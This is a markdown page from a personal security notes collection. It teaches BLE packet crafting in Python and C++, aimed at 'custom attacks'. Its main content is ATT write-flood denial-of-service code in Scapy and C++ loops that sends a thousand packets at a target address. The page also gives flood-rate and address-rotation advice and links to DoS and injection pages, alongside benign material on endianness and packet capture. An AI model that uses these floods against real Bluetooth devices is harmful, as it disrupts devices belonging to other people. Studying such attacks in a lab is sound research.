---
title: BLE Scripting & Packet Crafting
tags: [BLE, scripting, packet-crafting, python, cpp, hci]
category: BLE Security
parent: "[[Bluetooth/BLE/README]]"
status: active
---

# BLE Scripting & Packet Crafting

## Overview

This section covers practical implementation techniques for crafting BLE packets from scratch using Python and C++. Master these skills to implement custom attacks, bypassing library limitations and gaining precise control over protocol behavior.

## Why Packet Crafting?

### Limitations of Standard Tools
- **gatttool/hcitool**: Limited to valid operations, no fuzzing
- **BlueZ API**: Abstracts away header fields, prevents malformed packets
- **nRF SDK**: Requires firmware development for custom PDUs

### Benefits of Low-Level Crafting
- ✅ **Full control**: Set any header field (LLID, SN, NESN, etc.)
- ✅ **Fuzzing**: Send malformed packets, invalid values
- ✅ **Performance**: Optimize for speed in flood attacks
- ✅ **Protocol research**: Understand wire-format deeply

## Document Organization

### Packet Crafting Basics
[[Bluetooth/BLE/Scripting/01-packet-crafting-basics|01. Packet Crafting Basics (Python & C++)]]
- Binary data fundamentals (endianness, bit fields)
- Python `struct` module and Scapy
- C++ bit manipulation and packing
- Layer-by-layer crafting examples
- Validation and debugging techniques

### Coming Soon
- 02. HCI Command Implementation
- 03. Attack Automation Framework
- 04. nRF52840 Firmware Development
- 05. Performance Optimization

## Quick Start: Python

```python
import struct
import socket

# Craft ATT Write Command (0x52)
opcode = 0x52
handle = 0x0010
value = b'\xFF' * 100

# Build ATT PDU
att_pdu = struct.pack('<BH', opcode, handle) + value

# Wrap in L2CAP (CID 0x0004 = ATT)
l2cap_pkt = struct.pack('<HH', len(att_pdu), 0x0004) + att_pdu

# Send via HCI socket (requires root)
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
sock.bind((0,))  # hci0
# ... send HCI ACL Data packet with l2cap_pkt
```

## Quick Start: C++

```cpp
#include <cstdint>
#include <vector>

// Craft ATT Write Command
uint8_t opcode = 0x52;
uint16_t handle = 0x0010;
std::vector<uint8_t> value(100, 0xFF);

// Build ATT PDU
std::vector<uint8_t> att_pdu;
att_pdu.push_back(opcode);
att_pdu.push_back(handle & 0xFF);        // Little-endian
att_pdu.push_back((handle >> 8) & 0xFF);
att_pdu.insert(att_pdu.end(), value.begin(), value.end());

// Wrap in L2CAP
uint16_t l2cap_len = att_pdu.size();
uint16_t l2cap_cid = 0x0004;
std::vector<uint8_t> l2cap_pkt;
l2cap_pkt.push_back(l2cap_len & 0xFF);
l2cap_pkt.push_back((l2cap_len >> 8) & 0xFF);
l2cap_pkt.push_back(l2cap_cid & 0xFF);
l2cap_pkt.push_back((l2cap_cid >> 8) & 0xFF);
l2cap_pkt.insert(l2cap_pkt.end(), att_pdu.begin(), att_pdu.end());

// Send via HCI (use BlueZ or custom implementation)
```

## Layer-by-Layer Crafting

### Physical Layer (PHY)
- **Access**: Requires SDR (HackRF, USRP) or Ubertooth
- **Use case**: Jamming, raw signal injection
- **Complexity**: High (RF knowledge required)

### Link Layer (LL)
- **Access**: nRF52840 custom firmware or Ubertooth (TX mode)
- **Use case**: Advertising floods, connection manipulation
- **Complexity**: Medium (firmware development)

### HCI Layer
- **Access**: Linux HCI sockets (`/dev/hciX`) or nRF UART
- **Use case**: Controller commands, ACL data injection
- **Complexity**: Low (Python/C with sockets)

### L2CAP Layer
- **Access**: HCI ACL Data packets or BlueZ L2CAP sockets
- **Use case**: Signaling storms, fragmentation attacks
- **Complexity**: Low (wrap ATT/SMP in L2CAP header)

### ATT/GATT Layer
- **Access**: L2CAP CID 0x0004 or gatttool
- **Use case**: Write floods, read floods, notification storms
- **Complexity**: Very Low (simple opcodes + handles)

### SMP Layer
- **Access**: L2CAP CID 0x0006 or BlueZ pairing commands
- **Use case**: Pairing spam, invalid crypto
- **Complexity**: Medium (crypto understanding needed)

## Tools & Libraries

### Python
| Tool | Purpose | Installation |
|------|---------|--------------|
| **struct** | Binary packing/unpacking | Built-in |
| **socket** | HCI socket access | Built-in |
| **Scapy** | High-level packet crafting | `pip install scapy` |
| **bluepy** | BLE GATT client | `pip install bluepy` |
| **pybluez** | Bluetooth sockets | `pip install pybluez` |

### C++
| Tool | Purpose | Installation |
|------|---------|--------------|
| **BlueZ headers** | HCI definitions | `sudo apt install libbluetooth-dev` |
| **Zephyr RTOS** | nRF52840 firmware | [zephyrproject.org](https://zephyrproject.org) |
| **nRF SDK** | Nordic development | [nordicsemi.com](https://nordicsemi.com) |

### Hardware
| Device | TX Capability | RX Capability | Firmware Customization |
|--------|---------------|---------------|------------------------|
| **Linux + BlueZ** | HCI commands | HCI events | No (driver-level) |
| **nRF52840** | Full control | Full control | Yes (C/C++) |
| **Ubertooth** | Limited (adv only) | Full (all channels) | Yes (C) |
| **ESP32** | HCI commands | HCI events | Yes (Arduino/IDF) |

## Attack Implementation Workflow

```
1. Define Attack → [[Bluetooth/BLE/DoS/README|Choose DoS Vector]]
   └─ Select target layer and operation

2. Identify Header Fields → [[Bluetooth/BLE/DoS/03-dos-attack-cheatsheet|Cheatsheet]]
   └─ Lookup opcodes, field sizes

3. Craft Packet
   └─ Use Python struct or C++ bit manipulation

4. Send Packet
   └─ HCI socket (Linux) or UART (nRF)

5. Validate
   └─ Capture with Wireshark/btmon/Ubertooth

6. Automate
   └─ Loop with rate control, address rotation
```

## Example: ATT Write Flood

### Python (using Scapy)
```python
from scapy.all import *
from scapy.layers.bluetooth import *

# Connect to target
target = "AA:BB:CC:DD:EE:FF"
handle = 0x0010

# Craft write commands
for i in range(1000):
    pkt = HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr(cid=0x0004) / \
          ATT_Hdr(opcode=0x52) / ATT_Write_Command(gatt_handle=handle, data=b'\xFF'*100)
    send(pkt)
```

### C++ (using BlueZ HCI)
```cpp
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <sys/socket.h>

int hci_sock = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
// ... bind to hci0, get connection handle

for (int i = 0; i < 1000; i++) {
    uint8_t att_pdu[] = {0x52, 0x10, 0x00, /* value bytes */};
    uint8_t l2cap_pkt[4 + sizeof(att_pdu)];
    // ... pack L2CAP header + att_pdu
    // ... pack HCI ACL Data packet
    write(hci_sock, hci_packet, hci_packet_len);
    usleep(5000);  // 5ms = 200 Hz
}
```

## Binary Data Cheatsheet

### Endianness in Python
```python
struct.pack('<H', 0x1234)  # Little-endian: b'\x34\x12'
struct.pack('>H', 0x1234)  # Big-endian: b'\x12\x34'
```

### Bit Manipulation in C++
```cpp
// Extract bits 4-7 from byte
uint8_t byte = 0b11010110;
uint8_t bits = (byte >> 4) & 0x0F;  // 0b1101

// Set bits 2-3 to 0b11
byte |= (0x3 << 2);  // byte = 0b11011110
```

### Common struct Format Strings
| Format | Type | Size | Endian |
|--------|------|------|--------|
| `<B` | Unsigned byte | 1 | Little |
| `<H` | Unsigned short | 2 | Little |
| `<I` | Unsigned int | 4 | Little |
| `<Q` | Unsigned long long | 8 | Little |
| `>H` | Unsigned short | 2 | Big |
| `6s` | Bytes (string) | 6 | N/A |

## Debugging & Validation

### btmon (HCI Monitor)
```bash
sudo btmon -w capture.log
# Shows all HCI commands, events, ACL data
```

### Wireshark
```bash
wireshark -i bluetooth0 -k
# Filter: bthci_acl || btatt || btl2cap
```

### Ubertooth
```bash
ubertooth-btle -f -c capture.pcap
# Captures over-the-air BLE packets
```

## Common Pitfalls

1. **Endianness Errors**: BLE uses little-endian, check byte order
2. **CRC/MIC**: Controller adds these, don't include in HCI packets
3. **Connection Handle**: Must have active connection for ACL data
4. **MTU Limits**: Max ATT payload = MTU - 3 (default MTU = 23)
5. **Rate Limiting**: Controller may drop packets if too fast
6. **Permissions**: HCI raw sockets require root access

## Performance Tips

- **Python**: Use `socket.send()` instead of Scapy for speed
- **C++**: Pre-allocate buffers, avoid repeated allocations
- **nRF**: Use DMA for high-rate transmission
- **Rate**: For floods, aim for 100-500 Hz (1-10ms intervals)

## Next Steps

- Study [[Bluetooth/BLE/Scripting/01-packet-crafting-basics|detailed crafting guide]]
- Implement [[Bluetooth/BLE/DoS/README|DoS attacks]] with custom packets
- Combine with [[Bluetooth/BLE/Injection/README|injection techniques]]
- Capture with [[Traffic-Capture/README|Wireshark pipeline]]

---

**Related**:
- [[Bluetooth/BLE/README|BLE Home]]
- [[Bluetooth/BLE/01-protocol-overview|Protocol Overview]]
- [[Bluetooth/BLE/DoS/03-dos-attack-cheatsheet|Header Field Reference]]
- [[Lab-Setup/README|Lab Setup]]

**Status**: Active development - Packet crafting guide complete, automation framework coming soon
